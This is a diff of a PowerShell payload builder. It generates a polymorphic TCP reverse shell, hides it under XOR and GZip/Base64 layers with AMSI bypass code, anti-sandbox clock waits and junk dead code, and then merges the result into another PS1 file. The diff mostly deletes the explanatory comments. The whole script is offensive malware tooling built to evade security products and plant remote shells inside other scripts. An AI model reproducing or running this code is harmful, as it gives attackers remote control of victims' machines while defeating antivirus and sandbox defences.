@@ -65,9 +65,6 @@ param(
 Set-StrictMode -Version Latest
 $ErrorActionPreference = 'Stop'
 
-# ==========================================================================
-# CORE HELPERS
-# ==========================================================================
 
 function Get-RandomName {
     param([int]$MinLen=5, [int]$MaxLen=11)
@@ -111,10 +108,7 @@ function Build-JunkBlock {
     return "`$$v1=$n1`n`$$v2='$s1'`nif(`$$v1 -gt $($n1+1)){`$$v3=`$$v2.Length}"
 }
 
-# ==========================================================================
-# CONFUSE MODE HELPERS
-# All produce PS code for the OUTER layer of the output PS1.
-# ==========================================================================
+# CONFUSE
 
 function Build-RandomComment {
     # Random comment line of random length with random printable content.
@@ -126,7 +120,7 @@ function Build-RandomComment {
 }
 
 function Build-RandomCommentBlock {
-    # Multiple random comment lines - injected at key points.
+    # Multiple random comment lines  
     param([int]$MinLines=2, [int]$MaxLines=6)
     $count = Get-Random -Minimum $MinLines -Maximum ($MaxLines + 1)
     $lines = @()
@@ -138,7 +132,7 @@ function Build-RandomCommentBlock {
 }
 
 function Build-RandomMathLine {
-    # One dead-code arithmetic assignment.
+    #   dead-code a 
     $v  = Get-RandomName
     $a  = Get-Random -Minimum 100    -Maximum 9999999
     $b  = Get-Random -Minimum 2      -Maximum 99999
@@ -152,7 +146,7 @@ function Build-RandomMathLine {
 }
 
 function Build-RandomMathBlock {
-    # Several dead-code math assignments.
+    #   dead-code math  .
     param([int]$MinLines=4, [int]$MaxLines=12)
     $count = Get-Random -Minimum $MinLines -Maximum ($MaxLines + 1)
     $lines = @()
@@ -161,7 +155,7 @@ function Build-RandomMathBlock {
 }
 
 function Build-RandomLoop {
-    # One do-nothing for-loop with random iteration count and internal math.
+    #  nothing for-loop with random iteration count and internal math.
     $vIdx  = Get-RandomName
     $vAcc  = Get-RandomName
     $iters = Get-Random -Minimum 5000 -Maximum 999999
@@ -182,25 +176,18 @@ function Build-RandomLoopBlock {
 }
 
 function Build-ClockWait {
-    <#
-    Anti-sandbox clock-based busy-wait.
-    Spins until 7 real wall-clock seconds have elapsed from script start.
-    Uses [DateTime]::Now - NO Sleep/WaitForSingleObject.
-    Sandboxes hook Sleep to fast-forward time. Checking [DateTime]::Now
-    in a tight loop forces real elapsed time - defeats sleep acceleration.
-    Inside the loop: random arithmetic so it looks like computation, not a wait.
-    #>
+    #    Anti-sandbox clock-based busy-wait.     
     $vStart   = Get-RandomName
     $vNow     = Get-RandomName
     $vElapsed = Get-RandomName
     $vAcc     = Get-RandomName
     $vIdx     = Get-RandomName
 
-    # Random math lines inside the wait loop body
+    # Random math  
     $loopMath  = Build-RandomMathLine
     $loopMath2 = Build-RandomMathLine
 
-    # Randomise the DateTime/TimeSpan type casing
+    # Randomise 
     $kDT      = Randomize-Case 'DateTime'
     $kTS      = Randomize-Case 'TotalSeconds'
 
@@ -215,9 +202,7 @@ while(([$kDT]::Now-`$$vStart).$kTS -lt 7){
 "@
 }
 
-# ==========================================================================
-# LAYER 2 AMSI BYPASS BUILDERS (inside GZip blob)
-# ==========================================================================
+#   AMSI BYPAS 
 
 function Build-AmsiBypass-IntFlags-L2 {
     $rT  = Get-RandomName; $rF = Get-RandomName; $rBF = Get-RandomName
@@ -279,9 +264,7 @@ function Build-AmsiBypass-Patch-L2 {
     return $lines -join "`n"
 }
 
-# ==========================================================================
-# LAYER 1: POLYMORPHIC TCP REVERSE SHELL
-# ==========================================================================
+#   POLYMORPHIC 
 
 $vClient    = Get-RandomName; $vStream    = Get-RandomName
 $vBytes     = Get-RandomName; $vLen       = Get-RandomName
@@ -308,9 +291,8 @@ $shellL1 = @"
 "@
 $shellL1 = $shellL1.Trim()
 
-# ==========================================================================
-# XOR ENCODE LAYER 1 -> LAYER 2 XOR STUB
-# ==========================================================================
+#  
+# XOR ENCODE LAYER 
 
 $xorKey  = Get-Random -Minimum 1 -Maximum 254
 $xorEnc  = [int[]][char[]]$shellL1 | %{ $_ -bxor $xorKey }
@@ -324,9 +306,7 @@ $half    = [math]::Floor($xorEnc.Count / 2)
 $encExpr = "@($($xorEnc[0..($half-1)] -join ','),$($xorEnc[$half..($xorEnc.Count-1)] -join ','))"
 $xorStub = "`$$vXKey=$xorKey;`$$vXEnc=$encExpr;`$$vXDec=-join(`$$vXEnc|%{[$kChar](`$_-$kBxor`$$vXKey)});$kIex2 `$$vXDec"
 
-# ==========================================================================
-# ASSEMBLE LAYER 2 (GZip blob content)
-# ==========================================================================
+#  GZip blob conten 
 
 if ($NoBypass) {
     $layer2 = "try{$xorStub}catch{}"
@@ -344,9 +324,7 @@ if ($NoBypass) {
     $layer2 = "$bypassCode;try{$xorStub}catch{}"
 }
 
-# ==========================================================================
-# GZIP + BASE64 COMPRESS LAYER 2
-# ==========================================================================
+#   GZIP + BASE64 
 
 $msGen   = New-Object System.IO.MemoryStream
 $gzGen   = New-Object System.IO.Compression.GzipStream(
@@ -358,9 +336,7 @@ $gzGen.Write($l2Bytes, 0, $l2Bytes.Length)
 $gzGen.Close()
 $gzB64 = [Convert]::ToBase64String($msGen.ToArray())
 
-# ==========================================================================
-# BUILD OUTER GZIP DECODER STUB (Layer 3 - emitted into output PS1)
-# ==========================================================================
+#   GZIP DECODER  
 
 $vB   = Get-RandomName; $vMs  = Get-RandomName; $vGz  = Get-RandomName
 $vSr  = Get-RandomName; $vDec = Get-RandomName
@@ -388,7 +364,7 @@ for ($ci = 0; $ci -lt $nChunks; $ci++) {
 }
 $b64Expr = $b64chunks -join '+'
 
-# Outer stub lines with junk injected between each real line
+# Outer stub  
 $outerLines = @(
     "`$$vB=[$kConv]::FromBase64String($b64Expr)",
     (Build-JunkLine),
@@ -402,64 +378,52 @@ $outerLines = @(
 )
 $outerStub = $outerLines -join "`n"
 
-# ==========================================================================
-# ASSEMBLE FINAL OUTPUT PS1
-# ==========================================================================
+#  OUTPUT PS1 
 
 $rName  = Get-RandomName
 $rVer   = "$(Get-Random -Minimum 1 -Maximum 9).$(Get-Random -Minimum 0 -Maximum 99)"
 
-# Always-present sections
+#   sections
 $sections = [System.Collections.Generic.List[string]]::new()
 
-# Header comments (random long block at top of file)
+#   comments (random long block at top of file)
 $sections.Add("# $rName v$rVer")
 $sections.Add("`$ErrorActionPreference='SilentlyContinue'")
 $sections.Add((Build-JunkBlock))
 
 if ($Confuse) {
-    # --- CONFUSE BLOCK 1: Random comment block at top ---
+    
     $sections.Add((Build-RandomCommentBlock -MinLines 4 -MaxLines 9))
-
-    # --- CONFUSE BLOCK 2: Clock-based busy-wait (7 real seconds, no Sleep) ---
+    
     $sections.Add((Build-ClockWait))
-
-    # --- CONFUSE BLOCK 3: More random comments ---
-    $sections.Add((Build-RandomCommentBlock -MinLines 3 -MaxLines 6))
-
-    # --- CONFUSE BLOCK 4: Random do-nothing loops ---
+ 
+    $sections.Add((Build-RandomCommentBlock -MinLines 3 -MaxLines 6)) 
+	
     $sections.Add((Build-RandomLoopBlock -MinLoops 3 -MaxLoops 6))
-
-    # --- CONFUSE BLOCK 5: Random math dead code ---
+ 
     $sections.Add((Build-RandomMathBlock -MinLines 7 -MaxLines 17))
-
-    # --- CONFUSE BLOCK 6: More junk ---
+ 
     $sections.Add((Build-JunkBlock))
-
-    # --- CONFUSE BLOCK 7: Random comments before payload ---
+ 
     $sections.Add((Build-RandomCommentBlock -MinLines 4 -MaxLines 8))
 }
 
-# GZip decoder (always present)
+# GZip  
 $sections.Add($outerStub)
 
 # Trailing sections
 $sections.Add((Build-JunkBlock))
 
 if ($Confuse) {
-    # Trailing random comments and math after payload stub
+    # Trailing  
     $sections.Add((Build-RandomCommentBlock -MinLines 2 -MaxLines 5))
     $sections.Add((Build-RandomMathBlock -MinLines 4 -MaxLines 8))
 }
 
 $outputScript = $sections -join "`n`n"
-
-# Write output
+ 
 $outputScript | Out-File -FilePath $BasicShellFile -Encoding ascii -Force
-
-# ==========================================================================
-# DISPLAY
-# ==========================================================================
+ 
 
 $confuseLabel = if ($Confuse) { 'ON  (clock-wait + loops + math + comments)' } else { 'OFF (use -Confuse to enable)' }
 
@@ -572,10 +536,7 @@ function Invoke-ScriptMerge {
     Write-MergeSummary -InsertPath $insertPath -BasicShellFile $BasicShellFile -OutputPath $outputPath -MergedContent $merged
 }
 
-# ---------------------------------------------------------------------------
-# Merge PS1 Files
-# ---------------------------------------------------------------------------
-
+# Merge PS1 Files 
 Invoke-ScriptMerge -BasicShellFile $BasicShellFile -InsertFile $insertfile -OutputFile $outputfile
 
 Write-Host ' '
